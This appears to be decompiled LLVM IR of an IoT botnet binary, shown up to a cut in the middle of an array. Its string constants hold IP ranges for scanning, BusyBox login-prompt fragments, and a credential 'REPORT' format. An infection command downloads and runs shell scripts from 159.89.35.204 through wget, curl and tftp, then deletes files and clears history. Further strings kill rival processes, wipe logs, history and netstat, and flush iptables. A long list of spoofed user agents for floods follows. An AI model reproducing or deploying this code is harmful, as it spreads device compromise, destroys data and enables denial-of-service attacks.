@global_var_806c6f6.1217 = constant [12 x i8] c"85.38.%d.%d\00"
@global_var_806c702.1218 = constant [12 x i8] c"85.39.%d.%d\00"
@global_var_806c70e.1219 = constant [12 x i8] c"85.40.%d.%d\00"
@global_var_806c71a.1220 = constant [12 x i8] c"85.41.%d.%d\00"
@global_var_806c726.1221 = constant [12 x i8] c"85.42.%d.%d\00"
@global_var_806c732.1222 = constant [12 x i8] c"85.43.%d.%d\00"
@global_var_806c73e.1223 = constant [12 x i8] c"85.44.%d.%d\00"
@global_var_806c74a.1224 = constant [12 x i8] c"85.45.%d.%d\00"
@global_var_806c756.1225 = constant [12 x i8] c"85.46.%d.%d\00"
@global_var_806c762.1226 = constant [12 x i8] c"85.47.%d.%d\00"
@global_var_806c76e.1227 = constant [11 x i8] c"87.0.%d.%d\00"
@global_var_806c779.1228 = constant [11 x i8] c"87.1.%d.%d\00"
@global_var_806c784.1229 = constant [12 x i8] c"87.10.%d.%d\00"
@global_var_806c790.1230 = constant [12 x i8] c"87.12.%d.%d\00"
@global_var_806c79c.1231 = constant [12 x i8] c"87.13.%d.%d\00"
@global_var_806c7a8.1232 = constant [12 x i8] c"87.14.%d.%d\00"
@global_var_806c7b4.1233 = constant [12 x i8] c"87.16.%d.%d\00"
@global_var_806c7c0.1234 = constant [12 x i8] c"87.18.%d.%d\00"
@global_var_806c7cc.1235 = constant [11 x i8] c"87.2.%d.%d\00"
@global_var_806c7d7.1236 = constant [12 x i8] c"87.20.%d.%d\00"
@global_var_806c7e3.1237 = constant [12 x i8] c"87.21.%d.%d\00"
@global_var_806c7ef.1238 = constant [12 x i8] c"87.22.%d.%d\00"
@global_var_806c7fb.1239 = constant [12 x i8] c"87.23.%d.%d\00"
@global_var_806c807.1240 = constant [12 x i8] c"87.24.%d.%d\00"
@global_var_806c813.1241 = constant [12 x i8] c"87.25.%d.%d\00"
@global_var_806c81f.1242 = constant [12 x i8] c"87.28.%d.%d\00"
@global_var_806c82b.1243 = constant [12 x i8] c"87.29.%d.%d\00"
@global_var_806c837.1244 = constant [11 x i8] c"87.3.%d.%d\00"
@global_var_806c842.1245 = constant [12 x i8] c"87.30.%d.%d\00"
@global_var_806c84e.1246 = constant [11 x i8] c"87.4.%d.%d\00"
@global_var_806c859.1247 = constant [11 x i8] c"87.6.%d.%d\00"
@global_var_806c864.1248 = constant [11 x i8] c"87.8.%d.%d\00"
@global_var_806c86f.1249 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_806c87c.1250 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_806c889.1251 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_806c896.1252 = constant [12 x i8] c"88.32.%d.%d\00"
@global_var_806c8a2.1253 = constant [12 x i8] c"88.33.%d.%d\00"
@global_var_806c8ae.1254 = constant [12 x i8] c"88.34.%d.%d\00"
@global_var_806c8ba.1255 = constant [12 x i8] c"88.35.%d.%d\00"
@global_var_806c8c6.1256 = constant [12 x i8] c"88.36.%d.%d\00"
@global_var_806c8d2.1257 = constant [12 x i8] c"88.38.%d.%d\00"
@global_var_806c8de.1258 = constant [12 x i8] c"88.40.%d.%d\00"
@global_var_806c8ea.1259 = constant [12 x i8] c"88.42.%d.%d\00"
@global_var_806c8f6.1260 = constant [12 x i8] c"88.44.%d.%d\00"
@global_var_806c902.1261 = constant [12 x i8] c"88.46.%d.%d\00"
@global_var_806c90e.1262 = constant [12 x i8] c"88.48.%d.%d\00"
@global_var_806c91a.1263 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_806c925.1264 = constant [12 x i8] c"88.50.%d.%d\00"
@global_var_806c931.1265 = constant [12 x i8] c"88.52.%d.%d\00"
@global_var_806c93d.1266 = constant [12 x i8] c"88.54.%d.%d\00"
@global_var_806c949.1267 = constant [12 x i8] c"88.56.%d.%d\00"
@global_var_806c955.1268 = constant [12 x i8] c"88.58.%d.%d\00"
@global_var_806c961.1269 = constant [12 x i8] c"88.60.%d.%d\00"
@global_var_806c96d.1270 = constant [12 x i8] c"88.61.%d.%d\00"
@global_var_806c979.1271 = constant [12 x i8] c"88.62.%d.%d\00"
@global_var_806c985.1272 = constant [12 x i8] c"88.63.%d.%d\00"
@global_var_806c991.1273 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_806c99d.1274 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_806c9aa.1275 = constant [12 x i8] c"94.50.%d.%d\00"
@global_var_806c9b6.1276 = constant [12 x i8] c"94.80.%d.%d\00"
@global_var_806c9c2.1277 = constant [12 x i8] c"94.82.%d.%d\00"
@global_var_806c9ce.1278 = constant [12 x i8] c"94.84.%d.%d\00"
@global_var_806c9da.1279 = constant [12 x i8] c"94.86.%d.%d\00"
@global_var_806c9e6.1280 = constant [12 x i8] c"94.88.%d.%d\00"
@global_var_806c9f2.1281 = constant [12 x i8] c"94.90.%d.%d\00"
@global_var_806c9fe.1282 = constant [12 x i8] c"94.92.%d.%d\00"
@global_var_806ca0a.1283 = constant [12 x i8] c"94.93.%d.%d\00"
@global_var_806ca16.1284 = constant [12 x i8] c"94.94.%d.%d\00"
@global_var_806ca22.1285 = constant [12 x i8] c"94.95.%d.%d\00"
@global_var_806ca2e.1286 = constant [13 x i8] c"95.224.%d.%d\00"
@global_var_806ca3b.1287 = constant [13 x i8] c"95.228.%d.%d\00"
@global_var_806ca48.1288 = constant [13 x i8] c"95.230.%d.%d\00"
@global_var_806ca55.1289 = constant [13 x i8] c"95.231.%d.%d\00"
@global_var_806ca62.1290 = constant [13 x i8] c"95.232.%d.%d\00"
@global_var_806ca6f.1291 = constant [13 x i8] c"95.234.%d.%d\00"
@global_var_806ca7c.1292 = constant [13 x i8] c"95.236.%d.%d\00"
@global_var_806ca89.1293 = constant [13 x i8] c"95.238.%d.%d\00"
@global_var_806ca96.1294 = constant [13 x i8] c"95.240.%d.%d\00"
@global_var_806caa3.1295 = constant [13 x i8] c"95.241.%d.%d\00"
@global_var_806cab0.1296 = constant [13 x i8] c"95.242.%d.%d\00"
@global_var_806cabd.1297 = constant [13 x i8] c"95.244.%d.%d\00"
@global_var_806caca.1298 = constant [13 x i8] c"95.245.%d.%d\00"
@global_var_806cad7.1299 = constant [13 x i8] c"95.246.%d.%d\00"
@global_var_806cae4.1300 = constant [13 x i8] c"95.247.%d.%d\00"
@global_var_806caf1.1301 = constant [13 x i8] c"95.248.%d.%d\00"
@global_var_806cafe.1302 = constant [13 x i8] c"95.250.%d.%d\00"
@global_var_806cb0b.1303 = constant [13 x i8] c"95.252.%d.%d\00"
@global_var_806cb18.1304 = constant [13 x i8] c"95.253.%d.%d\00"
@global_var_806cb25.1305 = constant [13 x i8] c"95.254.%d.%d\00"
@global_var_806cb32.1306 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_8078864.1307 = local_unnamed_addr global i32 0
@global_var_806858b.1308 = constant [8 x i8] c"BusyBox\00"
@global_var_8068593.1309 = constant i32 2293796
@global_var_8068595.1310 = constant i32 1848115235
@global_var_80718a0.1311 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806858b.1308, i32 0, i32 0), i8* bitcast (i32* @global_var_8068593.1309 to i8*), i8* bitcast (i32* @global_var_8068595.1310 to i8*)]
@global_var_806855f.1312 = constant [7 x i8] c"nvalid\00"
@global_var_8068566.1313 = constant [6 x i8] c"ailed\00"
@global_var_806856c.1314 = constant [9 x i8] c"ncorrect\00"
@global_var_8068575.1315 = constant [6 x i8] c"enied\00"
@global_var_806857b.1316 = constant [5 x i8] c"rror\00"
@global_var_8068580.1317 = constant [7 x i8] c"oodbye\00"
@global_var_8068587.1318 = constant [4 x i8] c"bad\00"
@global_var_8071880.1319 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806855f.1312, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068566.1313, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806856c.1314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068575.1315, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806857b.1316, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068580.1317, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068587.1318, i32 0, i32 0)]
@global_var_8071864 = external global i32
@global_var_806cb3d.1324 = constant [3 x i8] c"\0D\0A\00"
@global_var_80718c0.1325 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806855f.1312, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068566.1313, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806856c.1314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068575.1315, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806857b.1316, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068580.1317, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068587.1318, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806858b.1308, i32 0, i32 0), i8* bitcast (i32* @global_var_8068593.1309 to i8*), i8* bitcast (i32* @global_var_8068595.1310 to i8*)]
@global_var_806cb40.1326 = constant i32 993024795
@global_var_806cbac.1327 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_8068404.1328 = constant [324 x i8] c"cd /tmp; wget http://159.89.35.204/bins.sh || curl -O http://159.89.35.204/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 159.89.35.204 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 159.89.35.204; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\0D\0A\00"
@global_var_8071860.1329 = local_unnamed_addr global [324 x i8]* @global_var_8068404.1328
@global_var_806cbdc.1339 = constant [5 x i8] c"wget\00"
@global_var_806cbe1.1340 = constant [6 x i8] c"armv*\00"
@global_var_806cbe7.1341 = constant [5 x i8] c"bot*\00"
@global_var_806cbec.1342 = constant [6 x i8] c"ntpd*\00"
@global_var_806cbf2.1343 = constant [7 x i8] c"hackz*\00"
@global_var_806cbf9.1344 = constant [8 x i8] c"shitty*\00"
@global_var_806cc01.1345 = constant [6 x i8] c"jack*\00"
@global_var_806cc07.1346 = constant [6 x i8] c"mips*\00"
@global_var_806cc0d.1347 = constant [5 x i8] c"sex*\00"
@global_var_806cc12.1348 = constant [4 x i8] c"i86\00"
@global_var_806cc16.1349 = constant [5 x i8] c"ssh*\00"
@global_var_806cc1b.1350 = constant [5 x i8] c"sh4*\00"
@global_var_806cc20.1351 = constant [11 x i8] c"jackmeoff*\00"
@global_var_806cc2b.1352 = constant [6 x i8] c"tftp*\00"
@global_var_806cc31.1353 = constant [4 x i8] c"i56\00"
@global_var_806cc35.1354 = constant [5 x i8] c"mips\00"
@global_var_806cc3a.1355 = constant [7 x i8] c"mipsel\00"
@global_var_806cc41.1356 = constant [4 x i8] c"sh4\00"
@global_var_806cc45.1357 = constant [4 x i8] c"x86\00"
@global_var_806cc49.1358 = constant [5 x i8] c"i686\00"
@global_var_806cc4e.1359 = constant [4 x i8] c"ppc\00"
@global_var_806cc52.1360 = constant [5 x i8] c"i586\00"
@global_var_806cc60.1361 = constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806cbdc.1339, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806cbe1.1340, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806cbe7.1341, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806cbec.1342, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806cbf2.1343, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806cbf9.1344, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806cc01.1345, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806cc07.1346, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806cc0d.1347, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806cc12.1348, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806cc16.1349, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806cc1b.1350, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806cc20.1351, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806cc2b.1352, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806cc31.1353, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806cc35.1354, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806cc3a.1355, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806cc41.1356, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806cc45.1357, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806cc49.1358, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806cc4e.1359, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806cc52.1360, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806cc52.1360, i32 0, i32 0)]
@global_var_806cd44.1371 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_806cdc5.1373 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_806cdd4.1374 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_806cdff.1375 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_806ce14.1376 = constant [22 x i8] c"history -c;history -w\00"
@global_var_806ce2a.1377 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_806ce38.1378 = constant [11 x i8] c"history -c\00"
@global_var_806ce43.1379 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_806ce5a.1380 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_806ce6e.1381 = constant [11 x i8] c"history -w\00"
@global_var_806ce79.1382 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_806ce8a.1383 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_806ce98.1384 = constant [22 x i8] c"service iptables stop\00"
@global_var_806ceb0.1385 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_806ced4.1386 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_806cf14.1387 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_806cf54.1388 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_806cfe4.1389 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_806d01c.1390 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_806d03c.1391 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_806d054.1392 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_806d0ac.1393 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_806d14c.1394 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_806d1a0.1395 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_806d214.1396 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_806d254.1397 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_806d30c.1398 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_806d360.1399 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_806d3b8.1400 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_806d410.1401 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_806d450.1402 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_806d498.1403 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_806d4f0.1404 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_806d55c.1405 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_806d5b4.1406 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_806d604.1407 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_806d628.1408 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_806d683.1409 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_806d694.1410 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_806d6c4.1411 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_806d6e8.1412 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_806d70a.1413 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_806d724.1414 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_806d764.1415 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_806d7f0.1416 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_806d838.1417 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_806d880.1418 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_806d8c8.1419 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_806d910.1420 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_806d964.1421 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_806d9b4.1422 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_806da20.1423 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_806da74.1424 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_806dad0.1425 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_806db2c.1426 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_806db90.1427 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_806dbec.1428 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_806dc48.1429 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_806dca4.1430 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_806dd04.1431 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_806dd4c.1432 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_806dde4.1433 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_806de30.1434 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_806de7c.1435 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_806decc.1436 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_806df14.1437 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_806df68.1438 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_806dfb8.1439 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_806e000.1440 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_806e04c.1441 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_806e098.1442 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_806e0e0.1443 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_806e130.1444 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_806e180.1445 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_806e1b4.1446 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_806e1e8.1447 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_806e240.1448 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_806ced4.1386, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_806cf14.1387, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_806cf54.1388, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_806cfe4.1389, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_806d01c.1390, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806d03c.1391, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_806d054.1392, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_806d0ac.1393, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_806d14c.1394, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_806d1a0.1395, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_806d214.1396, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_806d254.1397, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_806d30c.1398, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_806d360.1399, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_806d3b8.1400, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_806d410.1401, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_806d450.1402, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_806d498.1403, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_806d4f0.1404, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_806d55c.1405, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_806d5b4.1406, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_806d604.1407, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_806d628.1408, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_806d683.1409, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_806d694.1410, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_806d6c4.1411, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_806d6e8.1412, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_806d70a.1413, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_806d724.1414, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_806d764.1415, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_806d7f0.1416, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_806d838.1417, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_806d880.1418, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_806d8c8.1419, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_806d910.1420, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_806d964.1421, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_806d9b4.1422, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_806da20.1423, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_806da74.1424, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_806dad0.1425, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_806db2c.1426, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_806db90.1427, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_806dbec.1428, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_806dc48.1429, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_806dca4.1430, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_806dd04.1431, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_806dd4c.1432, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_806dde4.1433, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_806de30.1434, 